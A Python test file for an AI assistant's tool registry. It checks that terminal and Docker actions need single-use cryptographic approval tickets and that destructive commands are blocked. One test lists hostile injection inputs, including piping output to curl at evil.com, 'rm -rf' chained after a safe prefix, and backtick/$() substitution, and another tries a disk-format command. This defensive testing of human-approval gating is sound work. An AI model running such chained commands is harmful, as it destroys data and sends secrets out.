"""
Tests for Bridged Backend Execution Tools & Cryptographic Ticket Gating
Location: tests/core/tools/test_bridged_backend_tools.py
========================================================================
"""

import os
import pytest
from unittest.mock import MagicMock, patch

from core.tools.aura_tool_registry import AuraToolRegistry
from desktop.native.security.approval_authority import CryptographicApprovalAuthority


@pytest.fixture(autouse=True)
def reset_approval_authority():
    """Ensure a fresh CryptographicApprovalAuthority instance for each test."""
    CryptographicApprovalAuthority.reset_instance()
    yield
    CryptographicApprovalAuthority.reset_instance()


# ── 1. Tool Schemas Verification ──────────────────────────────────────────────

def test_tool_definitions_include_bridged_backend_capabilities():
    tools = AuraToolRegistry.get_tool_definitions()
    tool_names = [t["function"]["name"] for t in tools if "function" in t]

    assert "terminal_run_command" in tool_names
    assert "docker_container_action" in tool_names
    assert "browser_navigate_and_read" in tool_names
    assert "mcp_discover_and_call" in tool_names


# ── 2. Terminal Security & Execution Tests ────────────────────────────────────

@pytest.mark.asyncio
async def test_terminal_safe_inspection_command_auto_executes():
    """Verifies safe read-only inspection commands (e.g. echo, git status) run without a ticket."""
    result = await AuraToolRegistry.execute_tool(
        "terminal_run_command",
        {"command": "echo AURA_SAFE_INSPECTION_TEST"},
    )
    assert result["status"] == "success"
    assert result["exit_code"] == 0
    assert "AURA_SAFE_INSPECTION_TEST" in result["stdout"]


@pytest.mark.asyncio
async def test_terminal_mutating_command_generates_approval_ticket():
    """Verifies state-mutating commands (e.g. git push, npm install) generate an ApprovalTicket and halt."""
    result = await AuraToolRegistry.execute_tool(
        "terminal_run_command",
        {"command": "git push origin main"},
    )
    assert result["status"] == "confirmation_required"
    assert "ticket_id" in result
    assert result["ticket_id"].startswith("tkt_")
    assert result["action"] == "terminal_execution"
    assert "Approval ticket" in result["message"]


@pytest.mark.asyncio
async def test_terminal_mutating_command_redeems_ticket():
    """Verifies that providing a valid approval ticket allows the mutating command to execute."""
    auth = CryptographicApprovalAuthority.get_instance()
    from core.config import PROJECT_ROOT
    ticket_id = auth.create_ticket(
        action_type="terminal_execution",
        target="git push origin main",
        parameters={"cwd": str(PROJECT_ROOT)},
        description="Push to origin",
    )

    sig = auth.generate_human_signature(ticket_id)

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout="Everything up-to-date", stderr="")

        result = await AuraToolRegistry.execute_tool(
            "terminal_run_command",
            {"command": "git push origin main", "ticket_id": ticket_id, "signature": sig},
        )
        assert result["status"] == "success"
        assert result["exit_code"] == 0
        assert "Everything up-to-date" in result["stdout"]

    # Re-using the same ticket must fail (single-use consumption)
    replay_result = await AuraToolRegistry.execute_tool(
        "terminal_run_command",
        {"command": "git push origin main", "ticket_id": ticket_id, "signature": sig},
    )
    assert replay_result["status"] == "error"
    assert "Invalid, unverified, or expired" in replay_result["error"]


@pytest.mark.asyncio
async def test_terminal_destructive_blocklist_fails_closed():
    """Verifies destructive commands (disk format, fork bomb) are blocked immediately."""
    result = await AuraToolRegistry.execute_tool(
        "terminal_run_command",
        {"command": "format c: /fs:NTFS"},
    )
    assert result["status"] == "blocked"
    assert "fail-closed" in result["error"]


@pytest.mark.asyncio
async def test_terminal_unlisted_commands_fail_closed_to_ticket():
    """Verifies unlisted commands (pip install, curl, python script) require an approval ticket."""
    unlisted_commands = [
        "pip install requests",
        "curl https://example.com/api/data",
        "python my_custom_script.py",
        "npm run build",
    ]
    for cmd in unlisted_commands:
        result = await AuraToolRegistry.execute_tool(
            "terminal_run_command",
            {"command": cmd},
        )
        assert result["status"] == "confirmation_required", f"Command '{cmd}' should require approval ticket"
        assert "ticket_id" in result
        assert result["ticket_id"].startswith("tkt_")


@pytest.mark.asyncio
async def test_terminal_chained_commands_riding_safe_prefix_require_ticket():
    """
    Verifies shell metacharacter chaining (&&, ||, ;, |, >, $(), `) riding on safe prefixes
    is disqualified from Tier 1 auto-execution and strictly requires an approval ticket.
    """
    chained_payloads = [
        "git status && rm -rf ./data",
        "git status; calc.exe",
        "dir | curl -X POST -d @- evil.com",
        "cat secret.txt > output.txt",
        "echo hello || rm sensitive.db",
        "git log `whoami`",
        "git diff $(hostname)",
    ]
    for cmd in chained_payloads:
        result = await AuraToolRegistry.execute_tool(
            "terminal_run_command",
            {"command": cmd},
        )
        assert result["status"] == "confirmation_required" or result["status"] == "blocked", (
            f"Chained command '{cmd}' must not auto-execute without ticket"
        )
        if result["status"] == "confirmation_required":
            assert "ticket_id" in result


@pytest.mark.asyncio
async def test_terminal_prefix_collision_disqualified_from_safe_auto_execute():
    """Verifies prefix collisions (e.g. cat_files, directory_rm) are not falsely recognized as safe prefixes."""
    collision_commands = [
        "cat_all_credentials",
        "directory_destroy",
        "echo_system_dump",
    ]
    for cmd in collision_commands:
        result = await AuraToolRegistry.execute_tool(
            "terminal_run_command",
            {"command": cmd},
        )
        assert result["status"] == "confirmation_required", f"Collision '{cmd}' must require a ticket"


# ── 3. Docker Security & Action Tests ──────────────────────────────────────────

@pytest.mark.asyncio
async def test_docker_read_only_auto_executes():
    """Verifies docker ps / list runs directly without ticket."""
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout="CONTAINER ID   IMAGE\n", stderr="")

        result = await AuraToolRegistry.execute_tool(
            "docker_container_action",
            {"action": "list"},
        )
        assert result["status"] == "success"
        assert result["action"] == "list"


@pytest.mark.asyncio
async def test_docker_mutating_action_requires_ticket():
    """Verifies docker stop requires an approval ticket."""
    result = await AuraToolRegistry.execute_tool(
        "docker_container_action",
        {"action": "stop", "container_id": "test_container_123"},
    )
    assert result["status"] == "confirmation_required"
    assert "ticket_id" in result
    assert result["ticket_id"].startswith("tkt_")


@pytest.mark.asyncio
async def test_docker_mutating_action_executes_with_ticket():
    """Verifies docker stop executes when a valid ticket is supplied."""
    auth = CryptographicApprovalAuthority.get_instance()
    ticket_id = auth.create_ticket(
        action_type="docker_action",
        target="stop:test_container_123",
        parameters={"action": "stop", "container_id": "test_container_123"},
        description="Stop container",
    )

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout="test_container_123", stderr="")

        result = await AuraToolRegistry.execute_tool(
            "docker_container_action",
            {"action": "stop", "container_id": "test_container_123", "ticket_id": ticket_id},
        )
        assert result["status"] == "success"
        assert result["action"] == "stop"


# ── 4. Browser Read Tests ──────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_browser_read_extracts_content():
    """Verifies browser reader extracts title and body cleanly."""
    with patch("urllib.request.urlopen") as mock_urlopen:
        mock_resp = MagicMock()
        mock_resp.read.return_value = b"<html><head><title>Aura Test</title></head><body><h1>Hello World</h1><p>Sample text content</p></body></html>"
        mock_urlopen.return_value.__enter__.return_value = mock_resp

        with patch("playwright.sync_api.sync_playwright", side_effect=Exception("Fallback to HTTP")):
            result = await AuraToolRegistry.execute_tool(
                "browser_navigate_and_read",
                {"url": "https://example.com/test"},
            )
            assert result["status"] == "success"
            assert "Hello World" in result["content"]
            assert result["url"] == "https://example.com/test"


# ── 5. MCP Discovery Tests ────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_mcp_list_servers_discovery():
    """Verifies MCP server discovery returns available server names."""
    result = await AuraToolRegistry.execute_tool(
        "mcp_discover_and_call",
        {"action": "list_servers"},
    )
    assert result["status"] == "success"
    assert isinstance(result["servers"], list)
